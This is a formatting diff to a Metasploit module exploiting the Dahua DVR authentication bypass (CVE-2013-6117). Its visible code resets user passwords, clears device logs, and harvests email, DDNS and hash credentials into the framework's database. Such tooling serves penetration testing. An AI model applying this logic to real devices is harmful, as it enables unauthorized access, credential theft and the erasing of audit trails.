@@ -12,22 +12,20 @@ class Metasploit3 < Msf::Auxiliary
                                    'Jake Reynolds - Depth Security', # Vulnerability Discoverer
                                    'Tyler Bennett - Talos Infosec' # Metasploit Module
                                  ],
-            'References'      =>
-                                 [
+            'References'      => [
                                    [ 'CVE', '2013-6117' ],
                                    [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
                                  ],
             'License'         => MSF_LICENSE
           )
-          deregister_options('RHOST')
-          register_options(
-                [
-                  OptString.new('USERNAME', [true, 'A username to reset', '888888']),
-                  OptString.new('PASSWORD', [true, 'A password to reset the user with', 'abc123']),
-                  OptBool.new('RESET', [true, 'Reset an existing user\'s pw?', 'FALSE']),
-                  OptBool.new('CLEAR_LOGS', [true, 'Clear the DVR logs when we\'re done?', 'TRUE']),
-                  Opt::RPORT(37777)
-                ], self.class)
+          # deregister_options('RHOST')
+          register_options([
+            OptString.new('USERNAME', [true, 'A username to reset', '888888']),
+            OptString.new('PASSWORD', [true, 'A password to reset the user with', 'abc123']),
+            OptBool.new('RESET', [true, 'Reset an existing user\'s pw?', 'FALSE']),
+            OptBool.new('CLEAR_LOGS', [true, 'Clear the DVR logs when we\'re done?', 'TRUE']),
+            Opt::RPORT(37777)
+          ], self.class)
         end
 
         def run_host(ip)
@@ -90,8 +88,8 @@ class Metasploit3 < Msf::Auxiliary
                     print_status("Email Settings: @ #{rhost}:#{rport}!")
                     if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
                       if mailhost == $1.split(':')
-                         print_status("	Server: #{mailhost[0]}")  unless mailhost[0].nil?
-                         print_status("	Destination Email: #{data[1]}")  unless mailhost[1].nil?
+                        print_status("	Server: #{mailhost[0]}") unless mailhost[0].nil?
+                        print_status("	Destination Email: #{data[1]}") unless mailhost[1].nil?
                       end
                          if !data[5].nil? && !data[6].nil?
                            print_good("	SMTP User: #{data[5]}") unless data[5].nil?
@@ -298,25 +296,25 @@ class Metasploit3 < Msf::Auxiliary
 
        def report_hash(ip, rport, user, hash)
          service_data = {
-                address: ip,
-                port: rport,
-                service_name: 'dahua_dvr',
-                protocol: 'tcp',
-                workspace_id: myworkspace_id
+           address: ip,
+           port: rport,
+           service_name: 'dahua_dvr',
+           protocol: 'tcp',
+           workspace_id: myworkspace_id
          }
 
          credential_data = {
-                module_fullname: :fullname,
-                origin_type: :service,
-                private_data: hash,
-                private_type: :nonreplayable_hash,
-                jtr_format: 'dahua_hash',
-                username: user
+           module_fullname: :fullname,
+           origin_type: :service,
+           private_data: hash,
+           private_type: :nonreplayable_hash,
+           jtr_format: 'dahua_hash',
+           username: user
          }.merge(service_data)
 
          login_data = {
-               core: create_credential(credential_data),
-               status: Metasploit::Model::Login::Status::UNTRIED
+           core: create_credential(credential_data),
+           status: Metasploit::Model::Login::Status::UNTRIED
          }.merge(service_data)
 
          create_credential_login(login_data)
@@ -324,51 +322,51 @@ class Metasploit3 < Msf::Auxiliary
 
        def report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
          service_data = {
-                address: ddns_server,
-                port: ddns_port,
-                service_name: 'ddns settings',
-                protocol: 'tcp',
-                workspace_id: myworkspace_id
+           address: ddns_server,
+           port: ddns_port,
+           service_name: 'ddns settings',
+           protocol: 'tcp',
+           workspace_id: myworkspace_id
          }
 
          credential_data = {
-                module_fullname: :fullname,
-                origin_type: :service,
-                private_data: ddns_pass,
-                private_type: :password,
-                username: ddns_user
+           module_fullname: :fullname,
+           origin_type: :service,
+           private_data: ddns_pass,
+           private_type: :password,
+           username: ddns_user
          }.merge(service_data)
 
          login_data = {
-                 core: create_credential(credential_data),
-                 status: Metasploit::Model::Login::Status::UNTRIED
+           core: create_credential(credential_data),
+           status: Metasploit::Model::Login::Status::UNTRIED
          }.merge(service_data)
 
-        create_credential_login(login_data)
-      end
+         create_credential_login(login_data)
+       end
 
        def report_email_cred(mailserver, rport, muser, mpass)
          service_data = {
-                address: mailserver,
-                port: rport,
-                service_name: 'email settings',
-                protocol: 'tcp',
-                workspace_id: myworkspace_id
+           address: mailserver,
+           port: rport,
+           service_name: 'email settings',
+           protocol: 'tcp',
+           workspace_id: myworkspace_id
          }
 
          credential_data = {
-                module_fullname: :fullname,
-                origin_type: :service,
-                private_data: mpass,
-                private_type: :password,
-                username: muser
+           module_fullname: :fullname,
+           origin_type: :service,
+           private_data: mpass,
+           private_type: :password,
+           username: muser
          }.merge(service_data)
 
          login_data = {
-                 core: create_credential(credential_data),
-                 status: Metasploit::Model::Login::Status::UNTRIED
+           core: create_credential(credential_data),
+           status: Metasploit::Model::Login::Status::UNTRIED
          }.merge(service_data)
 
-        create_credential_login(login_data)
+         create_credential_login(login_data)
        end
 end
